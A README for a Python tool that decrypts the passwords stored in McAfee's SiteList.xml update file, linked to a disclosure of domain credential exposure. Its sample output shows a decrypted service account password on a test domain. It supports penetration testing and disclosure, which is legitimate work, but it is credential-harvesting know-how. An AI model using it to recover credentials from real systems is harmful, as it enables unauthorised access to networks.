McAfee SiteList Tool
====================
This tool will extract useful information from the McAfee update SiteList file and decrypt the associated password for each entry.

For more information about this vulnerability see [McAfee SiteList.XML Domain Credentials Disclosure](http://warchest.fusionx.com/mcafee-sitelist-xml-domain-credentials-disclosure/)

Usage
-----

    usage: sitelist.py [options]
    
    McAfee SiteList Decryptor v1.0 - david.rude@fusionx.com
    
    optional arguments:
      -h, --help   show this help message and exit
      -f file      sitelist.xml file to decrypt
      -p password  base64 encoded password

Example usage:

    $ python sitelist.py -f SiteList.xml
    
    HttpSite
    =============================================
    Server update.nai.com:80
    RelativePath Products/CommonUpdater
    Username (empty)
    Password (empty)
    =============================================
    
    
    UNCSite
    =============================================
    Server server
    RelativePath (empty)
    Share TestShare
    Domain TestDomain
    Username McSvcAccount
    Password Password1
    =============================================
    
    
    SpipeSite
    =============================================
    Server server.pwnag3.local:80
    ServerIP 192.168.209.10:80
    RelativePath Software
    Username (empty)
    Password (empty)
    =============================================
    
